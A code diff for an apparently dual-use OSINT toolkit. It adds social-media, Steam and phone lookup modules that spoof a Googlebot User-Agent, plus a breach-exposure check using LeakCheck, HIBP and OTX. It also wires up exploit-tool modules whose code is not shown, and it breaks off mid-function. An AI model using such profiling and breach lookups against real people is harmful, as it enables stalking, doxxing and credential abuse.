@@ -292,47 +292,36 @@ const REAL_LOOKUP_MODULES = new Set([
   // NETWORK (1-30)
   1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
   21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
-  // SOCIAL (31-50) — real free APIs
+  // SOCIAL (31-53, 60)
   31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
-  // 43-50: Twitter/LinkedIn/Instagram/TikTok/Twitch/YouTube/Telegram/Snapchat — paid APIs, simulated
+  43, 44, 45, 46, 47, 48, 49, 50, 53, 60,
   // RECON (51-100)
-  51, 52, 54,          // CORS, CSP, REST PROBE
-  55, 56, 57, 58, 59,  // DNSSEC, CAA, SPF, DKIM, MX DEEP DIVE
-  61, 62, 63, 64,      // NS, SOA, TXT, PTR
-  65, 66, 67, 68, 69, 70, // REDIRECT CHAIN, COOKIE AUDIT, HEADER GRADE, HSTS, HTTP METHODS, HTTP2
-  71,                  // VIN CHECK
-  72,                  // CLICKJACK
-  73, 74, 75, 76,      // OPEN REDIRECT, CORS WILDCARD, CONTENT SNIFF, XSS HEADERS
-  79, 80,              // PHISH CHECK, MALWARE URL (VirusTotal)
-  82, 83, 84, 85, 86, 87, 88, 89, 90, // DOMAIN AGE, BGP PREFIXES, HONEYPOT, BLOCKLIST, EMAIL VALIDATE, IPINFO FULL, ABUSE IPDB, OPEN RESOLVER, TRACEROUTE
-  92, 93, 94, 95, 96, 97, 98, 99, 100, // SSL, WAYBACK, HTTP FINGERPRINT, REVERSE IP, SUBDOMAIN, ADMIN, ROBOTS, API PROBE, CERT HISTORY
+  51, 52, 54,
+  55, 56, 57, 58, 59,
+  61, 62, 63, 64,
+  65, 66, 67, 68, 69, 70,
+  71, 72, 73, 74, 75, 76,
+  77, 78, 79, 80, 81,
+  82, 83, 84, 85, 86, 87, 88, 89, 90, 91,
+  92, 93, 94, 95, 96, 97, 98, 99, 100,
   // EXPLOIT (101-150)
-  101, 102, 103,       // ENTROPY, STRING EXTRACT, FILE IDENT
-  104, 105, 106, 107, 108, 109, 110, 111, // BASE64, HEX, URL, HTML, ROT13, CAESAR, VIGENERE, MORSE
-  112,                 // JWT DECODE
-  113, 114,            // JWT FORGE, HASH CRACK
-  115,                 // WORDLIST GEN
-  116, 117,            // XSS PAYLOADS, SQLI PAYLOADS
-  118,                 // BANNER GRAB
-  119, 120, 121, 122,  // FTP PROBE, SMTP PROBE, SSH FINGERPRINT, TELNET PROBE
+  101, 102, 103,
+  104, 105, 106, 107, 108, 109, 110, 111,
+  112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122,
+  123, 124, 125, 126, 127, 128, 129, 130, 131, 132,
+  133, 134, 135, 136, 137, 138, 139, 140, 141, 142,
+  143, 144, 145, 146, 147, 148, 149, 150,
   // INTEL (151-200)
-  147, 148,                     // NVD SEARCH, MITRE ATT&CK
-  151, 152, 153, 154, 155, 156, // CVE, MAC, SHODAN, THREAT INTEL, RIPE STAT, DUCK INTEL
-  181, 182, 183,                // BREACH INTEL, PASTE INTEL, DARK WEB INTEL (OTX)
-  180,                          // LEAK CHECK (leakcheck.io)
-  184, 185, 186,                // FCC CALLSIGN, HAM LOOKUP, DMR LOOKUP
-  157, 158, 159, 160, 161,      // AES, RSA, PASSPHRASE, HMAC, HASH COMPARE
-  162, 163, 164, 165, 166,      // CIDR CALC, IP CONVERT, SUBNET CALC, PORT REF, HTTP STATUS
-  167, 168,                     // EMAIL HEADER, USER AGENT
-  169, 170,                     // IOC EXTRACT, TYPOSQUAT
-  171, 172,                     // DOMAIN GEN, WEB SCRAPER
-  176, 177,                     // DANE CHECK, SMTP TLS
-  195,                          // LOG PARSE
-  // ADVANCED (201-230)
+  151, 152, 153, 154, 155, 156,
+  157, 158, 159, 160, 161, 162, 163, 164, 165, 166,
+  167, 168, 169, 170, 171, 172,
+  173, 174, 175, 176, 177, 178, 179,
+  180, 181, 182, 183, 184, 185, 186,
+  187, 188, 189, 190, 191, 192, 193, 194, 195,
+  196, 197, 198, 199, 200,
+  // ADVANCED (201-238)
   201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215,
-  216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, // ALL ADVANCED
-  230,
-  // NEW OSINT tools (231-238)
+  216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230,
   231, 232, 233, 234, 235, 236, 237, 238,
 ]);
 
@@ -3438,6 +3427,129 @@ async function runRealLookup(
       lines = await fetchCmsFingerprint(moduleId, target);
     } else if (moduleId === 238) {
       lines = await fetchNiktoHeaders(moduleId, target);
+    // ── NEW SOCIAL (43-50, 53, 60) ─────────────────────────────
+    } else if (moduleId === 43) {
+      lines = await fetchTwitterProfile(moduleId, target);
+    } else if (moduleId === 44) {
+      lines = await fetchLinkedInProfile(moduleId, target);
+    } else if (moduleId === 45) {
+      lines = await fetchInstagramProfile(moduleId, target);
+    } else if (moduleId === 46) {
+      lines = await fetchTikTokProfile(moduleId, target);
+    } else if (moduleId === 47) {
+      lines = await fetchTwitchProfile(moduleId, target);
+    } else if (moduleId === 48) {
+      lines = await fetchYouTubeProfile(moduleId, target);
+    } else if (moduleId === 49) {
+      lines = await fetchTelegramProfile(moduleId, target);
+    } else if (moduleId === 50) {
+      lines = await fetchSnapchatProfile(moduleId, target);
+    } else if (moduleId === 53) {
+      lines = await fetchSteamProfile(moduleId, target);
+    } else if (moduleId === 60) {
+      lines = await fetchTruecallerInfo(moduleId, target);
+    // ── BREACH / PASTE (77, 78, 81) ────────────────────────────
+    } else if (moduleId === 77) {
+      lines = await fetchBreachCheckLines(moduleId, target);
+    } else if (moduleId === 78) {
+      lines = await fetchHibpDomainLines(moduleId, target);
+    } else if (moduleId === 81) {
+      lines = await fetchPasteSearchLines(moduleId, target);
+    // ── SATELLITE (91) ─────────────────────────────────────────
+    } else if (moduleId === 91) {
+      lines = await fetchSatelliteLines(moduleId, target);
+    // ── EXPLOIT TOOLS (123-150) ────────────────────────────────
+    } else if (moduleId === 123) {
+      lines = await fetchDirBruteLines(moduleId, target);
+    } else if (moduleId === 124) {
+      lines = await fetchParamFuzzLines(moduleId, target);
+    } else if (moduleId === 125) {
+      lines = await fetchCookieForgeLines(moduleId, target);
+    } else if (moduleId === 126) {
+      lines = await fetchHeaderInjectLines(moduleId, target);
+    } else if (moduleId === 127) {
+      lines = await fetchSstiProbeLines(moduleId, target);
+    } else if (moduleId === 128) {
+      lines = await fetchXxeProbeLines(moduleId, target);
+    } else if (moduleId === 129) {
+      lines = await fetchPathTraverseLines(moduleId, target);
+    } else if (moduleId === 130) {
+      lines = await fetchOpenPortsLines(moduleId, target);
+    } else if (moduleId === 131) {
+      lines = await fetchSqlMapLines(moduleId, target);
+    } else if (moduleId === 132) {
+      lines = await fetchLdapEnumLines(moduleId, target);
+    } else if (moduleId === 133) {
+      lines = await fetchRdpProbeLines(moduleId, target);
+    } else if (moduleId === 134) {
+      lines = await fetchFtpEnumLines(moduleId, target);
+    } else if (moduleId === 135) {
+      lines = await fetchSnmpProbeLines(moduleId, target);
+    } else if (moduleId === 136) {
+      lines = await fetchNtpQueryLines(moduleId, target);
+    } else if (moduleId === 137) {
+      lines = await fetchDnsZoneAxfrLines(moduleId, target);
+    } else if (moduleId === 138) {
+      lines = await fetchDhcpProbeLines(moduleId, target);
+    } else if (moduleId === 139) {
+      lines = await fetchArpScanLines(moduleId, target);
+    } else if (moduleId === 140) {
+      lines = await fetchIcmpProbeLines(moduleId, target);
+    } else if (moduleId === 141) {
+      lines = await fetchOsFingerprintLines(moduleId, target);
+    } else if (moduleId === 142) {
+      lines = await fetchServiceVerLines(moduleId, target);
+    } else if (moduleId === 143) {
+      lines = await fetchVulnScanLines(moduleId, target);
+    } else if (moduleId === 144) {
+      lines = await fetchExploitSearchLines(moduleId, target);
+    } else if (moduleId === 145) {
+      lines = await fetchZeroDayRefLines(moduleId, target);
+    } else if (moduleId === 146) {
+      lines = await fetchCveDetailsLines(moduleId, target);
+    } else if (moduleId === 149) {
+      lines = await fetchThreatModelLines(moduleId, target);
+    } else if (moduleId === 150) {
+      lines = await fetchRedTeamReportLines(moduleId, target);
+    // ── CRYPTO / TLS (173-179) ─────────────────────────────────
+    } else if (moduleId === 173) {
+      lines = await fetchKeyStrengthLines(moduleId, target);
+    } else if (moduleId === 174) {
+      lines = await fetchCipherSuiteLines(moduleId, target);
+    } else if (moduleId === 175) {
+      lines = await fetchTlsAnalyzerLines(moduleId, target);
+    } else if (moduleId === 178) {
+      lines = await fetchMailSecurityLines(moduleId, target);
+    } else if (moduleId === 179) {
+      lines = await fetchHibpEmailLines(moduleId, target);
+    // ── FORENSICS (187-194) ────────────────────────────────────
+    } else if (moduleId === 187) {
+      lines = await fetchStegDetectLines(moduleId, target);
+    } else if (moduleId === 188) {
+      lines = await fetchFileMetadataLines(moduleId, target, 'METADATA STRIP — view all metadata from file URL');
+    } else if (moduleId === 189) {
+      lines = await fetchFileMetadataLines(moduleId, target, 'IMAGE EXIF — EXIF metadata extraction');
+    } else if (moduleId === 190) {
+      lines = await fetchFileMetadataLines(moduleId, target, 'PDF METADATA — PDF document properties');
+    } else if (moduleId === 191) {
+      lines = await fetchFileMetadataLines(moduleId, target, 'OFFICE METADATA — Office document properties');
+    } else if (moduleId === 192) {
+      lines = await fetchFileMetadataLines(moduleId, target, 'AUDIO METADATA — audio file tags');
+    } else if (moduleId === 193) {
+      lines = await fetchFileMetadataLines(moduleId, target, 'VIDEO METADATA — video container metadata');
+    } else if (moduleId === 194) {
+      lines = await fetchFileTimelineLines(moduleId, target);
+    // ── SIEM / SOC (196-200) ───────────────────────────────────
+    } else if (moduleId === 196) {
+      lines = await fetchSiemQueryLines(moduleId, target);
+    } else if (moduleId === 197) {
+      lines = await fetchYaraRuleLines(moduleId, target);
+    } else if (moduleId === 198) {
+      lines = await fetchMemoryDumpLines(moduleId, target);
+    } else if (moduleId === 199) {
+      lines = await fetchProcInspectLines(moduleId, target);
+    } else if (moduleId === 200) {
+      lines = await fetchRootkitCheckLines(moduleId, target);
     } else {
       lines = await fetchIpLookupLines(moduleId, target);
     }
@@ -3694,6 +3806,1807 @@ async function fetchNiktoHeaders(moduleId: number, target: string): Promise<stri
   } catch (err) {
     lines.push(`[ERROR] ${(err as Error).message}`);
   }
+  return lines;
+}
+
+// ── SOCIAL MEDIA MODULES (43-50, 53, 60) ─────────────────────────────────────
+
+async function fetchTwitterProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const username = target.replace(/^@/, '').trim();
+  lines.push(`[MODULE ${moduleId}] TWITTER/X PROFILE — public profile lookup`);
+  lines.push(`[TARGET] @${username}`);
+  lines.push(`[PROFILE URL] https://twitter.com/${username}`);
+  try {
+    const res = await fetch(`https://twitter.com/${encodeURIComponent(username)}`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
+      signal: AbortSignal.timeout(8000),
+      redirect: 'follow',
+    });
+    lines.push(`[STATUS] HTTP ${res.status} — profile ${res.status === 200 ? 'EXISTS' : 'NOT FOUND / SUSPENDED'}`);
+    if (res.status === 200) {
+      lines.push(`[DIRECT] https://twitter.com/${username}`);
+      lines.push(`[NITTER] https://nitter.poast.org/${username}`);
+      lines.push(`[ARCHIVE] https://web.archive.org/web/*/twitter.com/${username}`);
+      lines.push(`[GOOGLE DORK] site:twitter.com "${username}"`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[NOTE] Full analytics require Twitter API v2 Bearer token`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchLinkedInProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const slug = target.replace(/.*linkedin\.com\/in\//, '').replace(/\/$/, '').trim();
+  lines.push(`[MODULE ${moduleId}] LINKEDIN PROFILE — public profile existence check`);
+  lines.push(`[TARGET] ${slug}`);
+  lines.push(`[PROFILE URL] https://www.linkedin.com/in/${slug}`);
+  try {
+    const res = await fetch(`https://www.linkedin.com/in/${encodeURIComponent(slug)}`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
+      signal: AbortSignal.timeout(8000),
+      redirect: 'follow',
+    });
+    lines.push(`[STATUS] HTTP ${res.status} — ${res.status === 200 ? 'profile found' : 'not found or private'}`);
+  } catch (err) {
+    lines.push(`[NETWORK] ${(err as Error).message}`);
+  }
+  lines.push(`[GOOGLE DORK] site:linkedin.com/in "${slug}"`);
+  lines.push(`[CACHE] https://webcache.googleusercontent.com/search?q=cache:linkedin.com/in/${slug}`);
+  lines.push(`[ARCHIVE] https://web.archive.org/web/*/linkedin.com/in/${slug}`);
+  lines.push(`[NOTE] Full profile data requires LinkedIn API OAuth`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchInstagramProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const username = target.replace(/^@/, '').trim();
+  lines.push(`[MODULE ${moduleId}] INSTAGRAM PROFILE — public profile existence check`);
+  lines.push(`[TARGET] @${username}`);
+  lines.push(`[PROFILE URL] https://www.instagram.com/${username}/`);
+  try {
+    const res = await fetch(`https://www.instagram.com/${encodeURIComponent(username)}/`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
+      signal: AbortSignal.timeout(8000),
+      redirect: 'follow',
+    });
+    lines.push(`[STATUS] HTTP ${res.status} — ${res.status === 200 ? 'profile EXISTS' : 'NOT FOUND'}`);
+    if (res.status === 200) {
+      lines.push(`[DIRECT] https://www.instagram.com/${username}/`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[GOOGLE DORK] site:instagram.com "${username}"`);
+  lines.push(`[ARCHIVE] https://web.archive.org/web/*/instagram.com/${username}`);
+  lines.push(`[NOTE] Full data requires Instagram Graph API OAuth token`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchTikTokProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const username = target.replace(/^@/, '').trim();
+  lines.push(`[MODULE ${moduleId}] TIKTOK PROFILE — public profile existence check`);
+  lines.push(`[TARGET] @${username}`);
+  lines.push(`[PROFILE URL] https://www.tiktok.com/@${username}`);
+  try {
+    const res = await fetch(`https://www.tiktok.com/@${encodeURIComponent(username)}`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
+      signal: AbortSignal.timeout(10000),
+      redirect: 'follow',
+    });
+    lines.push(`[STATUS] HTTP ${res.status} — profile ${res.status === 200 ? 'EXISTS' : 'NOT FOUND'}`);
+    if (res.status === 200) lines.push(`[DIRECT] https://www.tiktok.com/@${username}`);
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[GOOGLE DORK] site:tiktok.com "@${username}"`);
+  lines.push(`[ARCHIVE] https://web.archive.org/web/*/tiktok.com/@${username}`);
+  lines.push(`[NOTE] Analytics require TikTok for Developers API credentials`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchTwitchProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const username = target.trim().toLowerCase();
+  lines.push(`[MODULE ${moduleId}] TWITCH CHANNEL — profile + stream status`);
+  lines.push(`[TARGET] ${username}`);
+  lines.push(`[CHANNEL URL] https://www.twitch.tv/${username}`);
+  try {
+    const res = await fetch(`https://www.twitch.tv/${encodeURIComponent(username)}`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
+      signal: AbortSignal.timeout(10000),
+    });
+    const exists = res.status === 200;
+    lines.push(`[STATUS] HTTP ${res.status} — channel ${exists ? 'EXISTS' : 'NOT FOUND'}`);
+    if (exists) {
+      const html = await res.text();
+      const metaDesc = html.match(/<meta[^>]+name="description"[^>]+content="([^"]+)"/)?.[1];
+      if (metaDesc) lines.push(`[META] ${metaDesc.slice(0, 200)}`);
+      lines.push(`[CHANNEL] https://www.twitch.tv/${username}`);
+      lines.push(`[CLIPS] https://www.twitch.tv/${username}/clips`);
+      lines.push(`[VIDEOS] https://www.twitch.tv/${username}/videos`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[NOTE] Subscriber counts require Twitch Helix API (Client-ID)`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchYouTubeProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const t = target.trim();
+  lines.push(`[MODULE ${moduleId}] YOUTUBE CHANNEL — public data via RSS feed`);
+  lines.push(`[TARGET] ${t}`);
+  const isChannelId = /^UC[a-zA-Z0-9_-]{22}$/.test(t);
+  const isHandle = t.startsWith('@');
+  try {
+    const handle = isHandle ? t.slice(1) : t;
+    const rssUrl = isChannelId
+      ? `https://www.youtube.com/feeds/videos.xml?channel_id=${t}`
+      : `https://www.youtube.com/feeds/videos.xml?user=${handle}`;
+    lines.push(`[RSS] ${rssUrl}`);
+    const res = await fetch(rssUrl, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+      signal: AbortSignal.timeout(8000),
+    });
+    if (res.ok) {
+      const xml = await res.text();
+      const channelName = xml.match(/<name>([^<]+)<\/name>/)?.[1];
+      const channelId = xml.match(/<yt:channelId>([^<]+)<\/yt:channelId>/)?.[1];
+      const videos = [...xml.matchAll(/<entry>/g)].length;
+      if (channelName) lines.push(`[CHANNEL] ${channelName}`);
+      if (channelId) {
+        lines.push(`[CHANNEL ID] ${channelId}`);
+        lines.push(`[URL] https://www.youtube.com/channel/${channelId}`);
+      }
+      lines.push(`[RECENT VIDEOS] ${videos} in feed`);
+      const titles = [...xml.matchAll(/<media:title>([^<]+)<\/media:title>/g)].slice(0, 3);
+      for (const m of titles) lines.push(`  ▸ ${m[1]}`);
+    } else {
+      lines.push(`[STATUS] HTTP ${res.status} — not found`);
+      lines.push(`[TIP] Use format: @ChannelHandle or UCxxxxxxxxxxxxxxxxxxxxxxxxxx`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchTelegramProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const username = target.replace(/^@/, '').trim();
+  lines.push(`[MODULE ${moduleId}] TELEGRAM — public channel/user lookup`);
+  lines.push(`[TARGET] @${username}`);
+  lines.push(`[URL] https://t.me/${username}`);
+  try {
+    const res = await fetch(`https://t.me/${encodeURIComponent(username)}`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+      signal: AbortSignal.timeout(8000),
+      redirect: 'follow',
+    });
+    lines.push(`[STATUS] HTTP ${res.status}`);
+    if (res.status === 200) {
+      const html = await res.text();
+      const title = html.match(/<meta[^>]+property="og:title"[^>]+content="([^"]+)"/)?.[1];
+      const desc = html.match(/<meta[^>]+property="og:description"[^>]+content="([^"]+)"/)?.[1];
+      const members = html.match(/(\d[\d,\s]*(?:members|subscribers|followers))/i)?.[1];
+      if (title) lines.push(`[NAME] ${title}`);
+      if (desc) lines.push(`[BIO] ${desc.slice(0, 200)}`);
+      if (members) lines.push(`[MEMBERS] ${members}`);
+      lines.push(`[PREVIEW] https://t.me/s/${username}`);
+      lines.push(`[APP LINK] tg://resolve?domain=${username}`);
+    } else {
+      lines.push(`[RESULT] Username not found or private`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchSnapchatProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const username = target.replace(/^@/, '').trim();
+  lines.push(`[MODULE ${moduleId}] SNAPCHAT — public story/profile existence check`);
+  lines.push(`[TARGET] ${username}`);
+  lines.push(`[STORY URL] https://story.snapchat.com/s/${username}`);
+  try {
+    const res = await fetch(`https://story.snapchat.com/s/${encodeURIComponent(username)}`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)' },
+      signal: AbortSignal.timeout(8000),
+      redirect: 'follow',
+    });
+    lines.push(`[STATUS] HTTP ${res.status} — ${res.status === 200 ? 'PUBLIC STORY FOUND' : 'not found or private'}`);
+    if (res.status === 200) {
+      const html = await res.text();
+      const title = html.match(/<title>([^<]+)<\/title>/)?.[1];
+      if (title) lines.push(`[TITLE] ${title}`);
+      lines.push(`[ADD] https://www.snapchat.com/add/${username}`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[GOOGLE DORK] site:snapchat.com "${username}"`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchSteamProfile(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const t = target.trim();
+  lines.push(`[MODULE ${moduleId}] STEAM ID — Steam community profile lookup`);
+  lines.push(`[TARGET] ${t}`);
+  const isNumeric = /^\d{17}$/.test(t);
+  const profileUrl = isNumeric
+    ? `https://steamcommunity.com/profiles/${t}`
+    : `https://steamcommunity.com/id/${t}`;
+  lines.push(`[PROFILE URL] ${profileUrl}`);
+  try {
+    const res = await fetch(`${profileUrl}?xml=1`, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+      signal: AbortSignal.timeout(8000),
+    });
+    lines.push(`[STATUS] HTTP ${res.status}`);
+    if (res.ok) {
+      const xml = await res.text();
+      if (xml.includes('<error>')) {
+        lines.push(`[RESULT] Profile not found or private`);
+      } else {
+        const get = (tag: string) => xml.match(new RegExp(`<${tag}>([^<]+)</${tag}>`))?.[1];
+        if (get('steamID64')) lines.push(`[STEAMID64] ${get('steamID64')}`);
+        if (get('steamID')) lines.push(`[STEAMID] ${get('steamID')}`);
+        if (get('realname')) lines.push(`[REAL NAME] ${get('realname')}`);
+        if (get('location')) lines.push(`[LOCATION] ${get('location')}`);
+        if (get('memberSince')) lines.push(`[MEMBER SINCE] ${get('memberSince')}`);
+        if (get('onlineState')) lines.push(`[STATUS] ${get('onlineState')}`);
+        if (get('summary')) lines.push(`[SUMMARY] ${get('summary')!.slice(0, 200).replace(/<[^>]+>/g, '')}`);
+        const id64 = get('steamID64');
+        if (id64) {
+          lines.push(`[STEAMDB] https://steamdb.info/calculator/?player=${id64}`);
+          lines.push(`[STEAMIDFINDER] https://www.steamidfinder.com/lookup/${id64}/`);
+        }
+        lines.push(`[GAMES] ${profileUrl}/games?tab=all`);
+        lines.push(`[FRIENDS] ${profileUrl}/friends`);
+      }
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchTruecallerInfo(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] TRUECALLER — phone number identity lookup`);
+  lines.push(`[TARGET] ${target}`);
+  lines.push(`[NOTE] Truecaller requires a registered account API token`);
+  const cleaned = target.replace(/\D/g, '');
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[ANALYSIS] Digits: ${cleaned.length}`);
+  if (cleaned.length === 11 && cleaned.startsWith('1')) {
+    const area = cleaned.slice(1, 4);
+    lines.push(`[AREA CODE] ${area} — US/Canada`);
+  } else if (cleaned.length > 10) {
+    lines.push(`[COUNTRY CODE] +${cleaned.slice(0, cleaned.length - 10)} (estimated)`);
+  }
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[ALTERNATIVES]`);
+  lines.push(`  NumVerify: numverify.com — carrier + line type (free tier)`);
+  lines.push(`  PhoneInfoga: pip install phoninfoga  →  phoninfoga scan -n "${target}"`);
+  lines.push(`  OSINT.industries: manual phone OSINT with social correlation`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+// ── BREACH / PASTE MODULES (77, 78, 81) ──────────────────────────────────────
+
+async function fetchBreachCheckLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const t = target.trim();
+  lines.push(`[MODULE ${moduleId}] BREACH CHECK — multi-source credential exposure scan`);
+  lines.push(`[TARGET] ${t}`);
+  const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(t);
+  const isHash = /^[0-9a-fA-F]{32,64}$/.test(t);
+  const isDomain = !isEmail && /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t);
+  const looksLikePassword = !isEmail && !isHash && !isDomain && t.length >= 4;
+
+  // ── 1. LeakCheck.io — real breach database (free public API) ──────────────
+  try {
+    const lcRes = await fetch(`https://leakcheck.io/api/public?check=${encodeURIComponent(t)}`, {
+      headers: { 'User-Agent': 'swept-sentinel-osint', 'Accept': 'application/json' },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (lcRes.ok) {
+      const lc = await lcRes.json() as { success?: boolean; found?: number; fields?: string[]; sources?: Array<{name?: string; date?: string}> };
+      if (lc.success) {
+        const found = lc.found ?? 0;
+        lines.push(`[LEAKCHECK.IO] ${found > 0 ? `⚠ FOUND IN ${found} BREACH SOURCE(S)` : 'Not found in indexed breach database'}`);
+        if (found > 0) {
+          if (lc.fields?.length) lines.push(`[EXPOSED DATA] ${lc.fields.join(', ')}`);
+          const dangerous = (lc.fields ?? []).filter(f => ['password', 'ssn', 'dob', 'ip', 'phone', 'address'].includes(f));
+          if (dangerous.length) lines.push(`[⚠ HIGH-RISK FIELDS] ${dangerous.join(', ')}`);
+          lines.push(`[BREACH SOURCES]`);
+          for (const s of (lc.sources ?? []).slice(0, 10)) {
+            lines.push(`  ▸ ${s.name ?? 'Unknown'}${s.date ? `  [${s.date}]` : ''}`);
+          }
+        }
+      } else {
+        lines.push(`[LEAKCHECK.IO] API returned no result for this query`);
+      }
+    } else {
+      lines.push(`[LEAKCHECK.IO] HTTP ${lcRes.status} — query could not be completed`);
+    }
+  } catch (err) {
+    lines.push(`[LEAKCHECK.IO] ${(err as Error).message}`);
+  }
+
+  // ── 2. HIBP Password k-anonymity check (free, no key needed) ─────────────
+  if (looksLikePassword || isHash) {
+    lines.push(`──────────────────────────────────────────────`);
+    try {
+      const crypto = await import('crypto');
+      const sha1 = crypto.createHash('sha1').update(t).digest('hex').toUpperCase();
+      const prefix = sha1.slice(0, 5);
+      const suffix = sha1.slice(5);
+      const pwRes = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
+        headers: { 'Add-Padding': 'true', 'User-Agent': 'swept-sentinel-osint' },
+        signal: AbortSignal.timeout(8000),
+      });
+      if (pwRes.ok) {
+        const text = await pwRes.text();
+        const match = text.split('\n').find(line => line.startsWith(suffix));
+        if (match) {
+          const count = match.split(':')[1]?.trim() ?? '?';
+          lines.push(`[HIBP PASSWORDS] ⚠ PWNED — found ${parseInt(count).toLocaleString()} times in breach datasets`);
+          lines.push(`[RISK] This password must not be used — it is in attacker wordlists`);
+        } else {
+          lines.push(`[HIBP PASSWORDS] Not found in any known breach (SHA1 k-anonymity check)`);
+        }
+        lines.push(`[SHA1] ${sha1}`);
+      }
+    } catch (err) {
+      lines.push(`[HIBP PASSWORDS] ${(err as Error).message}`);
+    }
+  }
+
+  // ── 3. OTX threat intelligence (email / domain) ───────────────────────────
+  lines.push(`──────────────────────────────────────────────`);
+  const domain = isEmail ? t.split('@')[1]! : isDomain ? t : '';
+  if (domain) {
+    try {
+      const apiKey = process.env.OTX_API_KEY;
+      if (apiKey) {
+        const [domainRes, emailRes] = await Promise.allSettled([
+          fetch(`https://otx.alienvault.com/api/v1/indicators/domain/${encodeURIComponent(domain)}/general`, {
+            headers: { 'X-OTX-API-KEY': apiKey }, signal: AbortSignal.timeout(8000),
+          }),
+          isEmail ? fetch(`https://otx.alienvault.com/api/v1/indicators/email/${encodeURIComponent(t)}/general`, {
+            headers: { 'X-OTX-API-KEY': apiKey }, signal: AbortSignal.timeout(8000),
+          }) : Promise.resolve(null as unknown as Response),
+        ]);
+        if (domainRes.status === 'fulfilled' && domainRes.value?.ok) {
+          const d = await domainRes.value.json() as Record<string, unknown>;
+          const pulses = ((d["pulse_info"] as Record<string, unknown>)?.["count"] as number) ?? 0;
+          const rep = (d["reputation"] as number) ?? 0;
+          lines.push(`[OTX DOMAIN] ${pulses} threat intel pulses for ${domain}${rep < 0 ? `  ⚠ reputation: ${rep}` : ''}`);
+        }
+        if (emailRes.status === 'fulfilled' && emailRes.value?.ok) {
+          const e = await emailRes.value.json() as Record<string, unknown>;
+          const pulses = ((e["pulse_info"] as Record<string, unknown>)?.["count"] as number) ?? 0;
+          if (pulses > 0) lines.push(`[OTX EMAIL] ${pulses} threat intel reports for ${t}`);
+        }
+      }
+    } catch { /* skip */ }
+  }
+
+  lines.push(`[MANUAL] https://haveibeenpwned.com/account/${encodeURIComponent(t)}`);
+  lines.push(`[DEHASHED] https://dehashed.com/search?query=${encodeURIComponent(t)}`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchHibpDomainLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const domain = target.trim().replace(/^https?:\/\//, '').split('/')[0].replace(/^.*@/, '');
